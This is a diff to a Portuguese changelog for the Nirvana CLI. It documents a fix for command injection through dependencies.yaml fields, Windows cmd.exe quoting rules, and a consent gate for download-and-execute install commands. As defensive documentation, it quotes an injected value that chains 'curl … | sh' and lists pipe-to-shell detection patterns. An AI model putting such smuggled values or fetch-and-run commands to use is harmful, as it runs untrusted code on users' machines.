@@ -8,6 +8,120 @@ do engine que o `npx @nirvana-os/cli` e as instalações de pack consomem.
 
 ## Não lançado
 
+### Um campo que se lê como dado deixa de poder rodar um comando
+
+O `dependencies.yaml` tem dois tipos de campo, e o activator rodava os dois como
+linha de shell. O `system[].install.<plataforma>` é linha de shell por desenho: o
+autor do squad escreve `brew install ffmpeg` ali, e sudo ou download acima de
+1 GB para antes, no portão de consentimento. Já `node:`, `python:`, `models[]` e os dois
+campos `repo` são dado. Tokens de pacote, um repo, uma url, um nome de arquivo,
+um caminho. Também eram juntados numa string de shell, então um manifesto com
+`- "left-pad; curl https://x/y.sh | sh"`, ou uma url de modelo com `;` no meio,
+executava um segundo comando durante o `nrv activate`, com os privilégios do
+próprio usuário e nenhum portão na frente. Envolver os tokens do pip em aspas
+simples só mudava a porta de lugar, porque um apóstrofo dentro do token as fecha.
+
+O `services[].repo` e o `custom_nodes[].repo` eram os dois últimos, interpolados
+numa linha de `git clone`. Todos esses caminhos agora executam um array de argv
+sem shell, e no macOS e no Linux um token só pode ser um argumento. O `models[]`
+ganha de quebra a metade silenciosa da mesma correção: um caminho de instalação
+com espaço se partia em dois argumentos. O `install_cmd`, o `start_cmd`, o
+`health_check` e o `post_install[]` continuam intactos — esses são comando por
+desenho, escritos pelo autor do squad, e seguem como linha de shell.
+
+O Windows exige um passo a mais, e deixá-lo por conta do runtime é o que tornava
+isso perigoso. `pip`, `uv`, `curl` e `huggingface-cli` são executáveis de verdade
+lá, então esses caminhos iniciam direto, sem shell nenhum. Já `npm`, `pnpm` e
+`yarn` vêm como shims `.cmd`, que runtime nenhum inicia sem shell, e o runtime
+não cita o token: o libuv só cita um argumento que contenha espaço, tab ou aspas
+duplas (`quote_cmd_arg`, `src/win/process.c`). Então a linha de comando passa a
+ser montada pelo activator, com cada argumento entre aspas, e entregue ao
+caminho de shell como `cmd.exe /d /s /c "<linha>"`, em que o `/s` retira o par
+externo que o runtime acrescenta e deixa o nosso de pé. `^`, `&`, `|`, `<`, `>`,
+`(` e `)` são dado ali dentro. Quatro caracteres não sobrevivem a citação
+nenhuma que o cmd.exe entenda e são recusados com nome: `"`, `%`, `!` e a quebra
+de linha. Nenhum spec dos packs publicados carrega um deles.
+
+Essa última parte importa por causa do que a auditoria encontrou. O
+`@remotion/cli@^4.0.0` viaja hoje no `creative-studio` e no `genesis-circle`, não
+tem espaço, tab nem aspas duplas, e o cmd.exe come o `^` como o próprio
+caractere de escape: no Windows ele estava sendo instalado como
+`@remotion/cli@4.0.0`. Outro range, sem erro, sem avisar ninguém. É um bug de
+correção que morava ao lado do de segurança, e a citação fecha os dois. O
+`system[].install` continua como estava, e o `--dry-run` passa a reportar o
+`argv` que iniciaria, ao lado da string de exibição.
+
+### Instalar buscando-e-executando passa a parar no portão de consentimento
+
+Esta muda o que você vê ao rodar `nrv activate`, então vale ler antes de
+atualizar.
+
+O `system[].install.<plataforma>` é linha de shell por desenho, e o portão de
+consentimento na frente dele casava exatamente uma coisa: `sudo`. Todo o resto
+rodava. Então `curl -fsSL https://bun.sh/install | bash`, que viaja hoje no
+`brandcraft` e no `grok-studio-nirvana`, executava o script de um terceiro na
+máquina do comprador sem perguntar nada, porque alguém disse "instale as
+dependências". O contrato de saída já prometia `2` para instalação pesada; isto
+cumpre uma promessa em vez de inventar outra.
+
+O portão agora também para um comando que baixa algo e executa, nas duas formas
+que isso tem. A direta é pipe ou substituição: `curl … | bash`, `| sh`, `| zsh`
+(com flags, redirecionamentos ou um `sudo -E` no meio), `wget -qO- … | sh`,
+`bash <(curl …)`, `sh -c "$(curl …)"`, `eval "$(curl …)"` e, no PowerShell,
+`iwr … | iex`, `irm … | iex`, `Invoke-WebRequest … | Invoke-Expression`. A de
+dois tempos é a mais comum no mundo real e não tem pipe nenhum: busca uma url
+remota e, no mesmo comando, roda um interpretador ou um caminho baixado —
+`curl … -o /tmp/x.zip && unzip … && sh /tmp/x/install`. O
+`ebook-maestro-nirvana` viaja hoje com exatamente isso no `genesis-circle` e no
+`publishing-knowledge`, para instalar o veraPDF.
+
+O item volta como `confirmation_required` com saída `2`, e a mensagem nomeia o
+comando exato, a url que será buscada, o interpretador que a executaria e
+**qual dos dois sinais disparou**. A distinção é de propósito: um pipe para
+dentro de um shell não é discutível, enquanto uma busca e um executor no mesmo
+comando são uma leitura forte dele. A segunda diz isso, e pede que você leia o
+comando antes de aceitar. O `--confirm-heavy` é o mesmo gesto que já aceitava
+sudo e download grande; não há nada novo para aprender.
+
+Medido contra todas as declarações `system[].install` dos packs (590 em 340
+manifestos): 75 param por forma direta, 5 pela de dois tempos (um comando
+distinto, o veraPDF), 145 continuam parando por sudo exatamente como antes, e
+365 passam intocadas.
+
+Baixar não é executar, e a diferença é o ponto. `curl -o modelo.bin <url>`,
+`curl … | tar -xz`, `brew install`, `apt-get install`, `winget install` e
+`git clone` não param para nada. Um portão que dispara em instalação comum é um
+portão que todo mundo aprende a passar sem ler.
+
+### O conteúdo pago cai onde o engine mora
+
+O `install-content.ts` resolvia `~/squads`, `~/businesses`,
+`~/businesses/_library/dna` e `~/.nirvana/packs` a partir de `os.homedir()`, uma
+vez, no escopo do módulo, enquanto o `installer.ts` honra `NIRVANA_HOME`,
+`SQUADS_DIR`, `BUSINESSES_DIR` e `DNA_LIBRARY`. Quem tem um home do Nirvana fora
+do padrão recebia o engine num lugar e o conteúdo pago em outro. Isso também
+tornava o overlay intestável por ambiente: `os.homedir()` segue `$HOME` no macOS
+e no Linux e `%USERPROFILE%` no Windows, e foi por isso que um teste que
+redirecionava só o `HOME` passava em dois runners e escrevia no perfil real no
+terceiro. As quatro raízes agora são preguiçosas e leem as mesmas variáveis que o
+`installer.ts` lê.
+
+### O `nrv run-track list` imprime o id que o `close` aceita
+
+A listagem mostrava o `project_id`, que é o nome do diretório. O `beat` e o
+`close` exigem o `run_id`, então o único comando que descobre runs abertos
+entregava um identificador ao qual os dois comandos que agem sobre eles
+respondem `not found`, e o id tinha que ser lido do SQLite na mão. Agora os dois
+são colunas rotuladas, porque são coisas diferentes.
+
+### Os READMEs alcançam o engine
+
+Os seis diziam "atualmente 0.8.1" com o engine em 0.10.0, e nenhum mencionava os
+dois comandos de manchete daquela release. A linha de status passa a dizer
+0.10.0, e a tabela de comandos ganhou uma linha para o `nrv validate`, o portão
+de admissão de squad, empresa e mind-clone, e outra para o `nrv migrate`, a
+conversão para o Squad Protocol 6.0.
+
 ## 0.10.0 — 2026-08-27
 
 ### Um projeto para de enxergar os runs dos outros
